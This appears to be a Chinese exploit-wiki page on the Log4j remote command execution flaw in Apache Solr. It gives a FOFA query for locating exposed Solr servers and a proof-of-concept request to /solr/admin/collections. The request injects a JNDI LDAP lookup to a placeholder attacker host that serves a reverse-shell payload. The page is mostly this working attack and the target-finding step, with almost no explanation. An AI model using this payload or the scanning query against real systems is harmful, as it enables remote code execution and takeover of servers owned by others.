---
title: Apache Solr Log4j组件 远程命令执行漏洞
---
# Apache Solr Log4j组件 远程命令执行漏洞

## 漏洞描述

Apache Solr Log4j组件 远程命令执行漏洞，详情略

## 漏洞影响

<a-checkbox checked>Apache Solr</a-checkbox></br>

## 网络测绘

<a-checkbox checked>
<a-button href="https://fofa.info/result?qbase64=YXBwPSJBUEFDSEUtU29sciI%3D">FOFA: app="APACHE-Solr"</a-button>
</a-checkbox>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1639122271639-51bacb0d-9e88-4234-87c2-cb374d1b98a3.png)

验证POC

```go
/solr/admin/collections?action=${jndi:ldap://xxx/Basic/ReverseShell/ip/87}&wt=json
```

![img](../../../.vuepress/public/img/1639122349239-d4352e9a-59b4-4562-afff-6a529d398d0e.png)

